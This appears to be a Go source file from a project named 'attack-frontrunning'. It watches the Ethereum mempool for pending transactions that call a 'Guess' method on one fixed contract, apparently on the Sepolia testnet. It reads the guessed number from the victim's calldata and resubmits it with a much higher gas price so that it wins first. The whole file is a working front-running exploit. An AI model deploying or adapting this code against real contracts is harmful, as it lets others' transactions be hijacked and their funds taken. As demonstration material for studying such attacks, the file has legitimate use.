package service

import (
	"attack-frontrunning/internal/build"
	"context"
	"crypto/ecdsa"
	"encoding/hex"
	"fmt"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/ethereum/go-ethereum/ethclient/gethclient"
	"github.com/ethereum/go-ethereum/rpc"
	"github.com/joho/godotenv"
	"math/big"
	"os"
	"strings"
	"time"
)

const (
	ContractAddress = "0x30181C5211facE95875D2eD21Dcce4D0188B1264"
	MethodGuess     = "9189fec1"
	ChainID         = 11155111
)

var (
	rpcClient  *rpc.Client
	privateKey *ecdsa.PrivateKey
	ethClient  *ethclient.Client
)

func init() {
	var err error
	err = godotenv.Load(".env")
	if err != nil {
		fmt.Println("Error loading .env file")
	}

	rpcClient, err = rpc.Dial(os.Getenv("RPC"))
	if err != nil {
		fmt.Println("rpc dial err:", err)
	}

	ethClient, err = ethclient.Dial(os.Getenv("RPC"))
	if err != nil {
		fmt.Println("eth client err:", err)
	}

	privateKey, err = crypto.HexToECDSA(os.Getenv("PRIVATE_KEY"))
	if err != nil {
		fmt.Println("private key err:", err)
	}

}

func ContractInteract() error {
	gethClient := gethclient.New(rpcClient)

	txs := make(chan *types.Transaction)
	subscription, err := gethClient.SubscribeFullPendingTransactions(context.Background(), txs)
	if err != nil {
		fmt.Printf("Failed to subscribe to pending transactions: %v", err)
		time.Sleep(5 * time.Second)
	}

	targetAddress := strings.TrimSpace(strings.ToLower(ContractAddress))
	seenTxs := make(map[common.Hash]bool)
	for {
		select {
		case tx := <-txs:
			txHash := tx.Hash()
			if !seenTxs[txHash] {
				seenTxs[txHash] = true
				if tx.To() != nil {
					to := strings.ToLower((*tx.To()).String())
					if to != targetAddress {
						continue
					}

					fmt.Printf("New pending transaction to target address:\n")
					fmt.Printf("Hash: %s\n", tx.Hash().Hex())
					fmt.Printf("To: %s\n", tx.To().Hex())
					fmt.Printf("Gas: %s\n", tx.GasPrice())

					data := tx.Data()
					methodID := data[:4]
					methodIDHex := hex.EncodeToString(methodID)
					if methodIDHex == MethodGuess {
						argument := data[4:36]
						correctNumber := new(big.Int).SetBytes(argument)
						err = AttackContract(ethClient, correctNumber.Int64(), tx.GasPrice().Int64())
						if err == nil {
							fmt.Printf("New contract success.\n")
							return nil
						}
					}
				}
			}
		case err = <-subscription.Err():
			fmt.Printf("Subscription error: %v", err)
		default:
			time.Sleep(time.Millisecond * 200)
			continue
		}
	}
}

func AttackContract(ethClient *ethclient.Client, correctNumber int64, gasPriceTx int64) error {
	auth, err := bind.NewKeyedTransactorWithChainID(privateKey, big.NewInt(ChainID))
	if err != nil {
		return fmt.Errorf("failed to create transactor: %v", err)
	}

	auth.GasPrice = big.NewInt(gasPriceTx + 100_000_000_000)
	auth.GasLimit = uint64(100_000)
	auth.Value = big.NewInt(10).Exp(big.NewInt(10), big.NewInt(15), nil)

	contractAddress := common.HexToAddress(ContractAddress)

	instance, err := build.NewContract(contractAddress, ethClient)
	if err != nil {
		return fmt.Errorf("failed to instantiate contract: %v", err)
	}

	tx, err := instance.Guess(auth, big.NewInt(correctNumber))
	if err != nil {
		return fmt.Errorf("failed to call guess function: %v", err)
	}

	fmt.Printf("Transaction sent: %s\n", tx.Hash().Hex())
	return nil
}
